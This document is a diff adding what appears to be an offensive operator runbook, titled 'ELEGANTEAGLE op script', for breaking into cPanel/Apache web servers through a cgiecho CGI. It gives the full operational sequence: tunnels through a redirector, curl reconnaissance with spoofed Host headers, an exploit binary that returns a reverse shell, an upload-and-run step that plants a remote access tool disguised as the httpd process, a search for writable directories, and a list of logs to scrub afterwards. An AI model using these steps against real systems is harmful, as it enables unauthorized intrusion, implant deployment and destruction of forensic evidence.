@@ -1,0 +1,145 @@
+#
+# ELEGANTEAGLE op script
+#
+
+mx
+:syntax on
+:colorscheme darkblue
+:%s#IP_ADDRESS_OF_REDIRECTOR#10.0.0.1#g
+:%s#IP_ADDRESS_OF_TARGET#10.1.1.1#g
+:%s#LOCAL_REDIRECTION_PORT#random14444-55555-1#g
+:%s#APPLICATION_LAYER_PROTOCOL#https#g
+:%s#SERVER_LISTEN_PORT#443#g
+:%s#CGIECHO_URL#cgi-sys/cgiecho#g
+:%s#CALLBACK_PORT#random14444-55555-2#g
+:%s#UPLOADNRUN_PS_NAME#/usr/local/apache/bin/httpd#g
+:%s#PATH_TO_RAT#/current/up/noserver-linux#g
+'x
+
+
+
+#
+# First, make sure the target is alive
+#
+-ping -r IP_ADDRESS_OF_TARGET -l IP_ADDRESS_OF_REDIRECTOR
+
+#
+# Now, set up your tunnels
+#
+
+-tunnel
+l LOCAL_REDIRECTION_PORT IP_ADDRESS_OF_TARGET SERVER_LISTEN_PORT
+r CALLBACK_PORT
+
+#
+# OK, so we need to find the main IP address and hostmane for this exploit to
+# work.
+#
+
+################################################################################
+#NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!!NOTE!!!
+################################################################################
+#
+# ALL OF THESE SCANS CAN LEAVE LOGS, SO BE CAREFUL AND CLEAN UP AFTER YOURSELF!!
+#
+################################################################################
+
+#
+# Give the following a try first, if you see a line that looks like :
+#
+#  <p>The document has moved <a href="http://somehost.somedomain.com/domainnotknown.html">here</a>.</p>
+#
+# Then you now have the main hostname for your server, congrats.
+#
+curl -v  APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/cgi-sys/domainredirect.cgi
+
+#
+# To confirm you have to correct IP address, you should run the following.  If
+# you get a generic apache page and not an application specific page, it is a
+# good bed you are on the main IP address.
+#
+
+curl APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/
+
+#
+# If needed, check if cpanel is setup to redirect to the main IP
+#
+
+curl -s --header "Host: cpanel.a.com" APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/
+
+#
+# Or try a nonexistant hostname and see if it redirects you to the main page
+#
+
+curl -s --header "Host: google-cachebot-07e33p29g.google.com" APPLICATION_LAYER_PROTOCOL://127.0.0.1:LOCAL_REDIRECTION_PORT/
+
+#
+# You can also try a reverse DNS lookup on your target (FROM PITCH)
+#
+
+nslookup IP_ADDRESS_OF_TARGET
+
+#
+# Now let's use the main hostname for the rest of the exploit, if you decide to
+# throw the exploit at the base IP address directly, then put in the IP address
+# in the replacement line below
+#
+
+mx
+:%s/TARGET_HOSTNAME/somehost.somedomain.com/g
+'x
+
+#
+# Ok, let's add the hostname to our /etc/hosts file
+#
+
+cat << _EOF_ >> /etc/hosts
+127.0.0.1 TARGET_HOSTAME
+_EOF_
+cat /etc/hosts
+
+
+#
+# Make sure you know what the options do...
+#
+./eerun -h -v
+
+#
+# And throw the exploit, this is how to get a reverse shell back from the target
+#
+./eerun APPLICATION_LAYER_PROTOCOL://TARGET_HOSTNAME:LOCAL_REDIRECTION_PORT/CGIECHO_URL callback IP_ADDRESS_OF_REDIRECTOR CALLBACK_PORT
+
+#
+# And this is how you upload NOPEN and have it call us back
+#
+./eerun APPLICATION_LAYER_PROTOCOL://TARGET_HOSTNAME:LOCAL_REDIRECTION_PORT/CGIECHO_URL uploadnrun -e "D=-ucIP_ADDRESS_OF_REDIRECTOR:CALLBACK_PORT" PATH_TO_RAT UPLOADNRUN_PS_NAME
+
+
+#
+# There are other things to do with this exploit, check the documentation to 
+# get an idea.
+#
+
+#
+# Once you are on, you are going to need to find a directory where you have
+# write permissions and is mounted executabe.  The find command below should
+# help with that:
+#
+
+find / -type d -perm -o+rwx 2>/dev/null
+
+#
+# Your working directory will currently be /, so go fix that
+#
+
+#
+# Cleaning:  Check the following locations for remnents of your exploit (plus
+# of course a full time sorted find ;-) )
+#
+
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/suexec_log
+/usr/local/apache/domlogs/*
+/var/log/dcpumon/toplog.*
+/var/log/dcpumon/<YEAR/<MONTH>/<DAY>
+
